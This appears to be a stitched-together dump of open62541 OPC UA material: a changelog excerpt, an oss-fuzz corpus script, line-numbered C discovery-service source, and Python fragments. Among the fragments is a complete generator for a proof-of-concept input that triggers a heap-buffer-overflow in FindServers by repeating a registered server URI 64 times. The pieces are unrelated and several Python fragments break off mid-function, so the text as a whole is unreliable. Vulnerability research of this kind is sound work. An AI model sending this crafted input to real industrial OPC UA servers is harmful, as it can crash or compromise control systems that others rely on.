This changelog reports changes to the public API. Internal refactorings and bug
fixes are not reported here.

2017-09-07 jpfr <julius.pfrommer at web.de>

 * Make Client Highlevel Interface consistent

   Two methods in the client highlevel interface were not conformant with the
   API convention that array sizes are given before the array pointer. This
   changes the signature of UA_Client_writeArrayDimensionsAttribute and
   UA_Client_readArrayDimensionsAttribute.

   The API changes are detected by the type-matching in the compiler. So there
   is little risk for bugs due to unaligned implementations.

2017-08-16 jpfr <julius.pfrommer at web.de>

 * Default Attribute Values for Node Attributes

   The AddNodes service takes a structure with the attributes of the new node as
   input. We began checking the consistency of the attributes more closely. You
   can now use constant global definitions with default values as a starting
   point. For example UA_VariableAttributes_default for adding a variable node.

 * All nodes have a context pointer

   All nodes now carry a context pointer. The context pointer is initially set
   to a user-defined memory location. The context pointer is passed to all
   user-visible callbacks involving the node.

 * Global and node-type constructor/destructor

   The constructors are fine-grained mechanisms to control the instantiation and
   deletion of nodes. Constructors receive the node context pointer and can also
   replace it.

2017-08-13 Infinity95 <mark.giraud at student.kit.edu>

 * New/Delete methods for the server configuration

   The default server configuration is no longer a constant global variable.
   Instead, it is now handled with a pair of new/delete methods. This enables
   the use of malloced members of the server configuration. With this change,
   the endpoint descriptions are no longer generated in the server but are
   created as part of the server configuration. See the example server
   implementations on how to use the configuration generation. The change is a
   precursor to the encryption implementation that ties into the generation of
   endpoint descriptions in the server config.

   The generation of the default server configuration is implemented as a
   "plugin". So it comes with CC0 licensing and can be freely adjusted by users.

   port for OPC UA and now used throughout all examples.

#!/usr/bin/env bash
set -e

# --------------------------------------------------------------------
# Copies all the corpus files, dict and options to the $OUT directory.
# This script is only used on oss-fuzz directly
# --------------------------------------------------------------------

fuzzerFiles=$(find $SRC/open62541/tests/fuzz/ -name "*.cc")

for F in $fuzzerFiles; do
	fuzzerName=$(basename $F .cc)

	if [ -d "$SRC/open62541/tests/fuzz/${fuzzerName}_corpus" ]; then

		# first combine any files in subfolders to one single binary file
		subDirs=$(find $SRC/open62541/tests/fuzz/${fuzzerName}_corpus -maxdepth 1 -mindepth 1 -type d)
		for dirPath in $subDirs; do
			dir=$(basename $dirPath)
			dirPathTmp=$SRC/open62541/tests/fuzz/${fuzzerName}_corpus/${dir}_tmp
			if [ -d  $dirPathTmp ]; then
				rm -r $dirPathTmp
			fi
			mkdir $dirPathTmp
			# copy the files to get unique names
			binFiles=$(find $dirPath -name "*.bin")
			for binFile in $binFiles; do
				binFileName=$(basename $binFile .bin)
				cp $binFile $dirPathTmp/${dir}_${binFileName}.bin
			done

			outPath=$dirPathTmp/$dir.bin
			cat $dirPath/*.bin > $outPath

			zip -j $OUT/${fuzzerName}_seed_corpus.zip $dirPathTmp/*

			rm -r $dirPathTmp

		done

		zip -j $OUT/${fuzzerName}_seed_corpus.zip $SRC/open62541/tests/fuzz/${fuzzerName}_corpus/*
	fi
done

cp $SRC/open62541/tests/fuzz/*.dict $SRC/open62541/tests/fuzz/*.options $OUT/----

155:                                &server->config.applicationDescription.applicationUri)) {
156:                 addSelf = UA_TRUE;
157:                 foundServersSize = 1;
158:                 break;
159:             }
160:         }
161:     } else {
162:         addSelf = UA_TRUE;
163:         foundServersSize = 1;
164:     }
165: #endif
166: 
167:     if(foundServersSize) {
168:         size_t fsSize = sizeof(UA_ApplicationDescription) * foundServersSize;
169:         foundServers = (UA_ApplicationDescription *)UA_malloc(fsSize);
170:         if(!foundServers) {
171:             if(foundServerFilteredPointer)
172:                 UA_free(foundServerFilteredPointer);
173:             response->responseHeader.serviceResult = UA_STATUSCODE_BADOUTOFMEMORY;
174:             return;
175:         }
176: 
177:         if(addSelf) {
178:             response->responseHeader.serviceResult =
179:                 setApplicationDescriptionFromServer(&foundServers[0], server);
180:             if(response->responseHeader.serviceResult != UA_STATUSCODE_GOOD) {
181:                 UA_free(foundServers);
182:                 if (foundServerFilteredPointer)
183:                     UA_free(foundServerFilteredPointer);
184:                 return;
185:             }
186:         }
187: 
188: #ifdef UA_ENABLE_DISCOVERY
189:         size_t currentIndex = 0;
190:         if (addSelf)
191:             currentIndex++;
192: 
193:         // add all the registered servers to the list
194: 
195:         if (foundServerFilteredPointer) {
196:             // use filtered list because client only requested specific uris
197:             // -1 because foundServersSize also includes this self server
198:             size_t iterCount = addSelf ? foundServersSize - 1 : foundServersSize;
199:             for (size_t i = 0; i < iterCount; i++) {
200:                 response->responseHeader.serviceResult =
201:                         setApplicationDescriptionFromRegisteredServer(request, &foundServers[currentIndex++],
202:                                                                       foundServerFilteredPointer[i]);
203:                 if (response->responseHeader.serviceResult != UA_STATUSCODE_GOOD) {
204:                     UA_free(foundServers);
205:                     UA_free(foundServerFilteredPointer);
206:                     return;
207:                 }
208:             }
209:             UA_free(foundServerFilteredPointer);
210:             foundServerFilteredPointer = NULL;
211:         } else {
212:             registeredServer_list_entry* current;
213:             LIST_FOREACH(current, &server->registeredServers, pointers) {
214:                 response->responseHeader.serviceResult =
215:                         setApplicationDescriptionFromRegisteredServer(request, &foundServers[currentIndex++],
216:                                                                       &current->registeredServer);
217:                 if (response->responseHeader.serviceResult != UA_STATUSCODE_GOOD) {
218:                     UA_free(foundServers);
219:                     return;
220:                 }
221:             }
222:         }
223: #endif
224:     }
225: 
226:     if (foundServerFilteredPointer)
227:         UA_free(foundServerFilteredPointer);
228: 
229:     response->servers = foundServers;
230:     response->serversSize = foundServersSize;
231: }

233: void Service_GetEndpoints(UA_Server *server, UA_Session *session,
234:                           const UA_GetEndpointsRequest *request,
235:                           UA_GetEndpointsResponse *response) {
236:     /* If the client expects to see a specific endpointurl, mirror it back. If
237:        not, clone the endpoints with the discovery url of all networklayers. */
238:     const UA_String *endpointUrl = &request->endpointUrl;
239:     if(endpointUrl->length > 0) {
240:         UA_LOG_DEBUG_SESSION(server->config.logger, session,
241:                              "Processing GetEndpointsRequest with endpointUrl "
242:                              UA_PRINTF_STRING_FORMAT, UA_PRINTF_STRING_DATA(*endpointUrl));
243:     } else {
244:         UA_LOG_DEBUG_SESSION(server->config.logger, session,
245:                              "Processing GetEndpointsRequest with an empty endpointUrl");
246:     }
247: 
248:     /* test if the supported binary profile shall be returned */
249:     size_t reSize = sizeof(UA_Boolean) * server->config.endpointsSize;
250:     UA_Boolean *relevant_endpoints = (UA_Boolean *)UA_alloca(reSize);
251:     memset(relevant_endpoints, 0, sizeof(UA_Boolean) * server->config.endpointsSize);
252:     size_t relevant_count = 0;
253:     if(request->profileUrisSize == 0) {
254:         for(size_t j = 0; j < server->config.endpointsSize; ++j)
255:             relevant_endpoints[j] = true;
256:         relevant_count = server->config.endpointsSize;
257:     } else {
258:         for(size_t j = 0; j < server->config.endpointsSize; ++j) {
259:             for(size_t i = 0; i < request->profileUrisSize; ++i) {
260:                 if(!UA_String_equal(&request->profileUris[i],
261:                                     &server->config.endpoints[j].endpointDescription.transportProfileUri))
262:                     continue;
263:                 relevant_endpoints[j] = true;
264:                 ++relevant_count;
265:                 break;
266:             }
267:         }
268:     }
269: 
270:     if(relevant_count == 0) {
271:         response->endpointsSize = 0;
272:         return;
273:     }
274: 
275:     /* Clone the endpoint for each networklayer? */
276:     size_t clone_times = 1;
277:     UA_Boolean nl_endpointurl = false;
278:     if(endpointUrl->length == 0) {
279:         clone_times = server->config.networkLayersSize;
280:         nl_endpointurl = true;
281:     }
282: 
283:     response->endpoints =
284:         (UA_EndpointDescription*)UA_Array_new(relevant_count * clone_times,
285:                                               &UA_TYPES[UA_TYPES_ENDPOINTDESCRIPTION]);
286:     if(!response->endpoints) {
287:         response->responseHeader.serviceResult = UA_STATUSCODE_BADOUTOFMEMORY;
288:         return;
289:     }
290:     response->endpointsSize = relevant_count * clone_times;
291: 
292:     size_t k = 0;
293:     UA_StatusCode retval = UA_STATUSCODE_GOOD;
294:     for(size_t i = 0; i < clone_times; ++i) {
295:         if(nl_endpointurl)
296:             endpointUrl = &server->config.networkLayers[i].discoveryUrl;
297:         for(size_t j = 0; j < server->config.endpointsSize; ++j) {
298:             if(!relevant_endpoints[j])
299:                 continue;
300:             retval |= UA_EndpointDescription_copy(&server->config.endpoints[j].endpointDescription,
301:                                                   &response->endpoints[k]);
302:             retval |= UA_String_copy(endpointUrl, &response->endpoints[k].endpointUrl);
303:             ++k;
304:         }
305:     }
306: 
307:     if(retval != UA_STATUSCODE_GOOD) {
308:         response->responseHeader.serviceResult = retval;
309:         UA_Array_delete(response->endpoints, response->endpointsSize,
310:                         &UA_TYPES[UA_TYPES_ENDPOINTDESCRIPTION]);
311:         response->endpoints = NULL;
312:         response->endpointsSize = 0;
313:         return;
314:     }
315: }

326: static void
327: process_RegisterServer(UA_Server *server, UA_Session *session,
328:                        const UA_RequestHeader* requestHeader,
329:                        const UA_RegisteredServer *requestServer,
330:                        const size_t requestDiscoveryConfigurationSize,
331:                        const UA_ExtensionObject *requestDiscoveryConfiguration,
332:                        UA_ResponseHeader* responseHeader,
333:                        size_t *responseConfigurationResultsSize,
334:                        UA_StatusCode **responseConfigurationResults,
335:                        size_t *responseDiagnosticInfosSize,
336:                        UA_DiagnosticInfo *responseDiagnosticInfos) {
337:     /* Find the server from the request in the registered list */
338:     registeredServer_list_entry* current;
339:     registeredServer_list_entry *registeredServer_entry = NULL;
340:     LIST_FOREACH(current, &server->registeredServers, pointers) {
341:         if (UA_String_equal(&current->registeredServer.serverUri, &requestServer->serverUri)) {
342:             registeredServer_entry = current;
343:             break;
344:         }
345:     }
346: 
347:     UA_MdnsDiscoveryConfiguration *mdnsConfig = NULL;
348: 
349:     const UA_String* mdnsServerName = NULL;
350:     if(requestDiscoveryConfigurationSize) {
351:         *responseConfigurationResults =
352:             (UA_StatusCode *)UA_Array_new(requestDiscoveryConfigurationSize,
353:                                           &UA_TYPES[UA_TYPES_STATUSCODE]);
354:         if(!(*responseConfigurationResults)) {
355:             responseHeader->serviceResult = UA_STATUSCODE_BADOUTOFMEMORY;
356:             return;
357:         }
358:         *responseConfigurationResultsSize = requestDiscoveryConfigurationSize;
359: 
360:         for(size_t i = 0; i < requestDiscoveryConfigurationSize; i++) {
361:             const UA_ExtensionObject *object = &requestDiscoveryConfiguration[i];
362:             if(!mdnsConfig && (object->encoding == UA_EXTENSIONOBJECT_DECODED ||
363:                                object->encoding == UA_EXTENSIONOBJECT_DECODED_NODELETE) &&
364:                (object->content.decoded.type == &UA_TYPES[UA_TYPES_MDNSDISCOVERYCONFIGURATION])) {
365:                 mdnsConfig = (UA_MdnsDiscoveryConfiguration *)object->content.decoded.data;
366:                 mdnsServerName = &mdnsConfig->mdnsServerName;
367:                 (*responseConfigurationResults)[i] = UA_STATUSCODE_GOOD;
368:             } else {
369:                 (*responseConfigurationResults)[i] = UA_STATUSCODE_BADNOTSUPPORTED;
370:             }
371:         }
372:     }
373: 
374:     if(!mdnsServerName && requestServer->serverNamesSize)
375:         mdnsServerName = &requestServer->serverNames[0].text;
376: 
377:     if(!mdnsServerName) {
378:         responseHeader->serviceResult = UA_STATUSCODE_BADSERVERNAMEMISSING;
379:         return;
380:     }
381: 
382:     if(requestServer->discoveryUrlsSize == 0) {
383:         responseHeader->serviceResult = UA_STATUSCODE_BADDISCOVERYURLMISSING;
384:         return;
385:     }
386: 
387:     if(requestServer->semaphoreFilePath.length) {
388: #ifdef UA_ENABLE_DISCOVERY_SEMAPHORE
389:         char* filePath = (char*)
390:             UA_malloc(sizeof(char)*requestServer->semaphoreFilePath.length+1);
391:         if (!filePath) {
392:             UA_LOG_ERROR_SESSION(server->config.logger, session,
393:                                    "Cannot allocate memory for semaphore path. Out of memory.");
394:             responseHeader->serviceResult = UA_STATUSCODE_BADOUTOFMEMORY;
395:             return;
396:         }
397:         memcpy(filePath, requestServer->semaphoreFilePath.data, requestServer->semaphoreFilePath.length );
398:         filePath[requestServer->semaphoreFilePath.length] = '\0';
399:         if(access( filePath, 0 ) == -1) {
400:             responseHeader->serviceResult = UA_STATUSCODE_BADSEMPAHOREFILEMISSING;
401:             UA_free(filePath);
402:             return;
403:         }
404:         UA_free(filePath);
405: #else
406:         UA_LOG_WARNING(server->config.logger, UA_LOGCATEGORY_CLIENT,
407:                        "Ignoring semaphore file path. open62541 not compiled "
408:                        "with UA_ENABLE_DISCOVERY_SEMAPHORE=ON");
409: #endif
410:     }
411: 
412: #ifdef UA_ENABLE_DISCOVERY_MULTICAST
413:     if(server->config.applicationDescription.applicationType == UA_APPLICATIONTYPE_DISCOVERYSERVER) {
414:         for(size_t i = 0; i < requestServer->discoveryUrlsSize; i++) {
415:             /* create TXT if is online and first index, delete TXT if is offline and last index */
416:             UA_Boolean updateTxt = (requestServer->isOnline && i==0) ||
417:                 (!requestServer->isOnline && i==requestServer->discoveryUrlsSize);
418:             UA_Discovery_update_MdnsForDiscoveryUrl(server, mdnsServerName, mdnsConfig,
419:                                                     &requestServer->discoveryUrls[i],
420:                                                     requestServer->isOnline, updateTxt);
421:         }
422:     }
423: #endif
424: 
425:     if(!requestServer->isOnline) {
426:         // server is shutting down. Remove it from the registered servers list
427:         if(!registeredServer_entry) {
428:             // server not found, show warning
429:             UA_LOG_WARNING_SESSION(server->config.logger, session,
430:                                    "Could not unregister server %.*s. Not registered.",
431:                                    (int)requestServer->serverUri.length, requestServer->serverUri.data);
432:             responseHeader->serviceResult = UA_STATUSCODE_BADNOTHINGTODO;
433:             return;
434:         }
435: 
436:         if(server->registerServerCallback)
437:             server->registerServerCallback(requestServer, server->registerServerCallbackData);
438: 
439:         // server found, remove from list
440:         LIST_REMOVE(registeredServer_entry, pointers);
441:         UA_RegisteredServer_deleteMembers(&registeredServer_entry->registeredServer);
442: #ifndef UA_ENABLE_MULTITHREADING
443:         UA_free(registeredServer_entry);
444:         server->registeredServersSize--;
445: #else
446:         server->registeredServersSize = uatomic_add_return(&server->registeredServersSize, -1);
447:         UA_Server_delayedCallback(server, freeEntry, registeredServer_entry);
448: #endif
449:         responseHeader->serviceResult = UA_STATUSCODE_GOOD;
450:         return;
451:     }
452: 
453:     UA_StatusCode retval = UA_STATUSCODE_GOOD;
454:     if (!registeredServer_entry) {
455:         // server not yet registered, register it by adding it to the list
456:         UA_LOG_DEBUG_SESSION(server->config.logger, session, "Registering new server: %.*s",
457:                              (int)requestServer->serverUri.length, requestServer->serverUri.data);
458: 
459:         registeredServer_entry =
460:             (registeredServer_list_entry *)UA_malloc(sizeof(registeredServer_list_entry));
461:         if(!registeredServer_entry) {
462:             responseHeader->serviceResult = UA_STATUSCODE_BADOUTOFMEMORY;
463:             return;
464:         }
465: 
466:         LIST_INSERT_HEAD(&server->registeredServers, registeredServer_entry, pointers);
467: #ifndef UA_ENABLE_MULTITHREADING
468:         server->registeredServersSize++;
469: #else
470:         server->registeredServersSize = uatomic_add_return(&server->registeredServersSize, 1);
471: #endif
472: 
473:         if(server->registerServerCallback)
474:             server->registerServerCallback(requestServer, server->registerServerCallbackData);
475:     } else {
476:         UA_RegisteredServer_deleteMembers(&registeredServer_entry->registeredServer);
477:     }
478: 
479:     // copy the data from the request into the list
480:     UA_RegisteredServer_copy(requestServer, &registeredServer_entry->registeredServer);
481:     registeredServer_entry->lastSeen = UA_DateTime_nowMonotonic();
482:     responseHeader->serviceResult = retval;
483: }

506: /* Cleanup server registration: If the semaphore file path is set, then it just
507:  * checks the existence of the file. When it is deleted, the registration is
508:  * removed. If there is no semaphore file, then the registration will be removed
509:  * if it is older than 60 minutes. */
510: void UA_Discovery_cleanupTimedOut(UA_Server *server, UA_DateTime nowMonotonic) {
511:     UA_DateTime timedOut = nowMonotonic;
512:     // registration is timed out if lastSeen is older than 60 minutes (default
513:     // value, can be modified by user).
514:     if(server->config.discoveryCleanupTimeout)
515:         timedOut -= server->config.discoveryCleanupTimeout*UA_SEC_TO_DATETIME;
516: 
517:     registeredServer_list_entry* current, *temp;
518:     LIST_FOREACH_SAFE(current, &server->registeredServers, pointers, temp) {
519:         UA_Boolean semaphoreDeleted = UA_FALSE;
520: 
521: #ifdef UA_ENABLE_DISCOVERY_SEMAPHORE
522:         if(current->registeredServer.semaphoreFilePath.length) {
523:             size_t fpSize = sizeof(char)*current->registeredServer.semaphoreFilePath.length+1;
524:             // todo: malloc may fail: return a statuscode
525:             char* filePath = (char *)UA_malloc(fpSize);
526:             if (filePath) {
527:                 memcpy(filePath, current->registeredServer.semaphoreFilePath.data,
528:                        current->registeredServer.semaphoreFilePath.length );
529:                 filePath[current->registeredServer.semaphoreFilePath.length] = '\0';
530: #ifdef UNDER_CE
531:                 FILE *fp = fopen(filePath,"rb");
532:                 semaphoreDeleted = (fp==NULL);
533:                 if(fp)
534:                     fclose(fp);
535: #else
536:                 semaphoreDeleted = access( filePath, 0 ) == -1;
537: #endif
538:                 UA_free(filePath);
539:             } else {
540:                 UA_LOG_ERROR(server->config.logger, UA_LOGCATEGORY_SERVER, "Cannot check registration semaphore. Out of memory");
541:             }
542:         }
543: #endif
544: 
545:         if(semaphoreDeleted || (server->config.discoveryCleanupTimeout &&
546:                                 current->lastSeen < timedOut)) {
547:             if(semaphoreDeleted) {
548:                 UA_LOG_INFO(server->config.logger, UA_LOGCATEGORY_SERVER,
549:                             "Registration of server with URI %.*s is removed because "
550:                             "the semaphore file '%.*s' was deleted.",
551:                             (int)current->registeredServer.serverUri.length,
552:                             current->registeredServer.serverUri.data,
553:                             (int)current->registeredServer.semaphoreFilePath.length,
554:                             current->registeredServer.semaphoreFilePath.data);
555:             } else {
556:                 // cppcheck-suppress unreadVariable
557:                 UA_LOG_INFO(server->config.logger, UA_LOGCATEGORY_SERVER,
558:                             "Registration of server with URI %.*s has timed out and is removed.",
559:                             (int)current->registeredServer.serverUri.length,
560:                             current->registeredServer.serverUri.data);
561:             }
562:             LIST_REMOVE(current, pointers);
563:             UA_RegisteredServer_deleteMembers(&current->registeredServer);
564: #ifndef UA_ENABLE_MULTITHREADING
565:             UA_free(current);
566:             server->registeredServersSize--;
567: #else
568:             server->registeredServersSize = uatomic_add_return(&server->registeredServersSize, -1);
569:             UA_Server_delayedCallback(server, freeEntry, current);
570: #endif
571:         }
572:     }
573: }

575: struct PeriodicServerRegisterCallback {
576:     UA_UInt64 id;
577:     UA_UInt32 this_interval;
578:     UA_UInt32 default_interval;
579:     UA_Boolean registered;
580:     const char* discovery_server_url;
581: };
582: 
583: /* Called by the UA_Server callback. The OPC UA specification says:
584:  *
585:  * > If an error occurs during registration (e.g. the Discovery Server is not running) then the Server
586:  * > must periodically re-attempt registration. The frequency of these attempts should start at 1 second
587:  * > but gradually increase until the registration frequency is the same as what it would be if not
588:  * > errors occurred. The recommended approach would double the period each attempt until reaching the maximum.
589:  *
590:  * We will do so by using the additional data parameter which holds information
591:  * if the next interval is default or if it is a repeaded call. */
592: static void
593: periodicServerRegister(UA_Server *server, void *data) {
594:     UA_assert(data != NULL);
595: 
596:     struct PeriodicServerRegisterCallback *cb = (struct PeriodicServerRegisterCallback *)data;
597: 
598:     /* Which URL to register on */
599:     // fixme: remove magic url
600:     const char * server_url;
601:     if(cb->discovery_server_url != NULL)
602:         server_url = cb->discovery_server_url;
603:     else
604:         server_url = "opc.tcp://localhost:4840";
605: 
606:     /* Register
607:        You can also use a semaphore file. That file must exist. When the file is
608:        deleted, the server is automatically unregistered. The semaphore file has
609:        to be accessible by the discovery server
610:     
611:        UA_StatusCode retval = UA_Server_register_discovery(server,
612:        "opc.tcp://localhost:4840", "/path/to/some/file");
613:     */
614:     UA_StatusCode retval = UA_Server_register_discovery(server, server_url, NULL);
615: 
616:     /* Registering failed */
617:     if(retval != UA_STATUSCODE_GOOD) {
618:         UA_LOG_ERROR(server->config.logger, UA_LOGCATEGORY_SERVER,
619:                      "Could not register server with discovery server. "
620:                      "Is the discovery server started? StatusCode %s",
621:                      UA_StatusCode_name(retval));
622: 
623:         /* If the server was previously registered, retry in one second,
624:          * else, double the previous interval */
625:         UA_UInt32 nextInterval = 1000;
626:         if(!cb->registered)
627:             nextInterval = cb->this_interval * 2;
628: 
629:         /* The interval should be smaller than the default interval */
630:         if(nextInterval > cb->default_interval)
631:             nextInterval = cb->default_interval;
632: 
633:         cb->this_interval = nextInterval;
634:         UA_Server_changeRepeatedCallbackInterval(server, cb->id, nextInterval);
635:         return;
636:     }
637: 
638:     /* Registering succeeded */
639:     UA_LOG_DEBUG(server->config.logger, UA_LOGCATEGORY_SERVER,
640:                  "Server successfully registered. Next periodical register will be in %d seconds",
641:                  (int)(cb->default_interval/1000));
642: 
643:     if(!cb->registered) {
644:         retval = UA_Server_changeRepeatedCallbackInterval(server, cb->id, cb->default_interval);
645:         /* If changing the interval fails, try again after the next registering */
646:         if(retval == UA_STATUSCODE_GOOD)
647:             cb->registered = true;
648:     }
649: }

651: UA_StatusCode
652: UA_Server_addPeriodicServerRegisterCallback(UA_Server *server,
653:                                             const char* discoveryServerUrl,
654:                                             UA_UInt32 intervalMs,
655:                                             UA_UInt32 delayFirstRegisterMs,
656:                                             UA_UInt64 *periodicCallbackId) {
657: 
658:     /* No valid server URL */
659:     if(!discoveryServerUrl) {
660:         UA_LOG_ERROR(server->config.logger, UA_LOGCATEGORY_SERVER,
661:                      "No discovery server URL provided");
662:         return UA_STATUSCODE_BADINTERNALERROR;
663:     }
664: 
665: 
666:     /* check if we are already registering with the given discovery url and remove the old periodic call */
667:     {
668:         periodicServerRegisterCallback_entry *rs, *rs_tmp;
669:         LIST_FOREACH_SAFE(rs, &server->periodicServerRegisterCallbacks, pointers, rs_tmp) {
670:             if (strcmp(rs->callback->discovery_server_url, discoveryServerUrl) == 0) {
671:                 UA_LOG_INFO(server->config.logger, UA_LOGCATEGORY_SERVER,
672:                             "There is already a register callback for '%s' in place. Removing the older one.", discoveryServerUrl);
673:                 UA_Server_removeRepeatedCallback(server, rs->callback->id);
674:                 LIST_REMOVE(rs, pointers);
675:                 UA_free(rs->callback);
676:                 UA_free(rs);
677:                 break;
678:             }
679:         }
680:     }
681: 
682:     /* Allocate and initialize */
683:     struct PeriodicServerRegisterCallback* cb =
684:         (struct PeriodicServerRegisterCallback*)
685:         UA_malloc(sizeof(struct PeriodicServerRegisterCallback));
686:     if(!cb)
687:         return UA_STATUSCODE_BADOUTOFMEMORY;
688: 
689:     /* Start repeating a failed register after 1s, then increase the delay. Set
690:      * to 500ms, as the delay is doubled before changing the callback
691:      * interval.*/
692:     cb->this_interval = 500;
693:     cb->default_interval = intervalMs;
694:     cb->registered = false;
695:     cb->discovery_server_url = discoveryServerUrl;
696: 
697: 
698: 
699:     /* Add the callback */
700:     UA_StatusCode retval =
701:         UA_Server_addRepeatedCallback(server, periodicServerRegister,
702:                                       cb, delayFirstRegisterMs, &cb->id);
703:     if(retval != UA_STATUSCODE_GOOD) {
704:         UA_LOG_ERROR(server->config.logger, UA_LOGCATEGORY_SERVER,
705:                      "Could not create periodic job for server register. "
706:                      "StatusCode %s", UA_StatusCode_name(retval));
707:         UA_free(cb);
708:         return retval;
709:     }
710: 
711: #ifndef __clang_analyzer__
712:     // the analyzer reports on LIST_INSERT_HEAD a use after free false positive
713:     periodicServerRegisterCallback_entry *newEntry =
714:             (periodicServerRegisterCallback_entry *)UA_malloc(sizeof(periodicServerRegisterCallback_entry));
715:     if(!newEntry) {

def parse_opn_body(payload):
    pos = 0
    def rd(n):
        nonlocal pos
        b = payload[pos:pos+n]; pos += n
        if len(b) != n: raise ValueError(f"need {n} bytes at {pos}, have {len(payload)-pos+n}")
        return b
    def u32(): return struct.unpack('<I', rd(4))[0]
    def i32(): return struct.unpack('<i', rd(4))[0]
    def string():
        l = i32()
        if l == -1: return None
        return rd(l)
    def nodeid():
        enc = rd(1)[0]
        if enc == 0x00: return ('twobyte', 0, rd(1)[0])
        if enc == 0x01: return ('fourbyte', rd(1)[0], struct.unpack('<H', rd(2))[0])
        if enc == 0x02: return ('numeric', struct.unpack('<H', rd(2))[0], struct.unpack('<I', rd(4))[0])
        if enc == 0x03: return ('string', struct.unpack('<H', rd(2))[0], string())
        if enc == 0x04: return ('guid', struct.unpack('<H', rd(2))[0], rd(16).hex())
        if enc == 0x05: return ('bytestring', struct.unpack('<H', rd(2))[0], string())
        raise ValueError(f"bad enc {enc}")
    def extobj():
        t = nodeid()
        enc = rd(1)[0]
        if enc == 0: return (t, 'no-body')
        if enc == 1: return (t, 'body', rd(4).hex())  # we can't decode body generically

#!/usr/bin/env python3
"""Generate a PoC for open62541 FindServers duplicate-serverUris heap overflow.

The raw input is a sequence of OPC UA TCP chunks processed in one call to
UA_Server_processBinaryMessage (as done by the fuzz target fuzz_binary_message):
  1. HEL   - opens the TCP-level connection
  2. OPN   - opens a SecureChannel (SecurityPolicy None, securityMode None)
  3. MSG   - RegisterServerRequest (registers "urn:open62541.example.server_multicast",
             making server->registeredServersSize == 1)
  4. MSG   - FindServersRequest with the same serverUri repeated N times
             -> Service_FindServers appends a pointer for every (duplicate) URI
             into foundServerFilteredPointer, which was allocated for only
             registeredServersSize (==1) entries -> heap-buffer-overflow.
"""
import struct
import sys

def u32(v): return struct.pack('<I', v & 0xffffffff)
def i32(v): return struct.pack('<i', v)
def u64(v): return struct.pack('<Q', v & 0xffffffffffffffff)
def sstring(s):
    b = s.encode('utf-8') if isinstance(s, str) else s
    return u32(len(b)) + b
def string_null(): return b'\xff\xff\xff\xff'
def nodeid_two(id_): return bytes([0x00, id_ & 0xff])
def nodeid_four(ns, ident): return bytes([0x01, ns & 0xff]) + u32(ident & 0xffff)[:2]
def extobj_null(): return nodeid_two(0) + b'\x00'

def request_header():
    return (nodeid_two(0) +      # authenticationToken = NodeId(0,0)
            u64(0) +             # timestamp
            u32(0) +             # requestHandle
            u32(0) +             # returnDiagnostics
            string_null() +      # auditEntryId
            u32(0) +             # timeoutHint
            extobj_null())       # additionalHeader

def chunk(msgtype, channel_id, token_id, seq, reqid, payload):
    body = u32(channel_id) + u32(token_id) + u32(seq) + u32(reqid) + payload
    hdr = msgtype + b'F' + u32(8 + len(body))
    return hdr + body

def msg_chunk(seq, reqid, type_id, service_body):
    return chunk(b'MSG', 1, 1, seq, reqid, nodeid_four(0, type_id) + service_body)

# ---------------- HEL ----------------
endpoint_url = "opc.tcp://localhost:4840"
hel_body = (u32(0) +          # protocolVersion
            u32(65535) +      # receiveBufferSize
            u32(65535) +      # sendBufferSize
            u32(0) +          # maxMessageSize
            u32(0) +          # maxChunkCount
            sstring(endpoint_url))
hel = b'HELF' + u32(8 + len(hel_body)) + hel_body
assert len(hel) == 8 + 4*5 + 4 + len(endpoint_url)

# ---------------- OPN ----------------
# OpenSecureChannelRequest, type id 446
opn_service = (request_header() +
               u32(0) +        # clientProtocolVersion
               i32(0) +        # requestType = Issue
               i32(0) +        # securityMode = None
               string_null() + # clientNonce
               u32(3600000))   # requestedLifetime
opn_payload = nodeid_four(0, 446) + opn_service
asym = (sstring("http://opcfoundation.org/UA/SecurityPolicy#None") +
        string_null() +   # senderCertificate
        string_null())    # receiverCertificateThumbprint
opn = chunk(b'OPN', 0, 0, 1, 1, asym + opn_payload)

# ---------------- RegisterServer (type id 437) ----------------
uri = "urn:open62541.example.server_multicast"
registered_server = (
    sstring(uri) +                              # serverUri
    sstring("http://open62541.org") +           # productUri
    u32(1) +                                    # serverNamesSize
    sstring("en") + sstring("open62541-based OPC UA Application") +  # serverNames[0]
    i32(0) +                                    # serverType = Server
    string_null() +                             # gatewayServerUri
    u32(1) +                                    # discoveryUrlsSize
    sstring("opc.tcp://fortiss-n-094:16665") +  # discoveryUrls[0]
    string_null() +                             # semaphoreFilePath
    b'\x01')                                    # isOnline = true
reg_service = request_header() + registered_server
reg = msg_chunk(2, 2, 437, reg_service)

# ---------------- FindServers (type id 422) ----------------
N = 64
server_uris = u32(N) + b''.join(sstring(uri) for _ in range(N))
find_service = (request_header() +
                string_null() +  # endpointUrl
                u32(0) +         # localeIds (empty)
                server_uris)     # serverUris (N duplicates)
find = msg_chunk(3, 3, 422, find_service)

poc = hel + opn + reg + find
with open(sys.argv[1] if len(sys.argv) > 1 else 'poc.bin', 'wb') as f:
    f.write(poc)
print("wrote", len(poc), "bytes")
print("hel len:", len(hel), "opn len:", len(opn), "reg len:", len(reg), "find len:", len(find))

def opn_chunk(channel_id, seq, reqid, asym, payload):
    # OPN chunks carry no symmetric security header (tokenId); the
    # AsymmetricAlgorithmSecurityHeader directly follows the channelId.
    body = u32(channel_id) + u32(seq) + u32(reqid) + asym + payload
    return b'OPNF' + u32(8 + len(body)) + body

    off = 12
    slen = struct.unpack('<i', d[off:off+4])[0]; off += 4 + slen
    slen = struct.unpack('<i', d[off:off+4])[0]; off += 4 + (slen if slen>=0 else 0)
    slen = struct.unpack('<i', d[off:off+4])[0]; off += 4 + (slen if slen>=0 else 0)
    seq, reqid = struct.unpack('<II', d[off:off+8]); off += 8
    p = d[off:]
    # typeId
    enc = p[0]
    assert enc == 1
    tid = struct.unpack('<H', p[2:4])[0]
    q = 4
    def u32(o): return struct.unpack('<I', p[o:o+4])[0]
    def i32(o): return struct.unpack('<i', p[o:o+4])[0]
    def nodeid(o):
        e = p[o]
        if e == 0: return ('twobyte', 0, p[o+1], o+2)
        if e == 1: return ('fourbyte', p[o+1], struct.unpack('<H', p[o+2:o+4])[0], o+4)
    # auth token
    at = nodeid(q); q = at[3]
    ts = p[q:q+8]; q += 8
    rh = u32(q); q += 4
    rd_ = u32(q); q += 4
    alen = i32(q); q += 4
    if alen >= 0: q += alen
    th = u32(q); q += 4
    # additional header extobj: nodeid + encoding byte
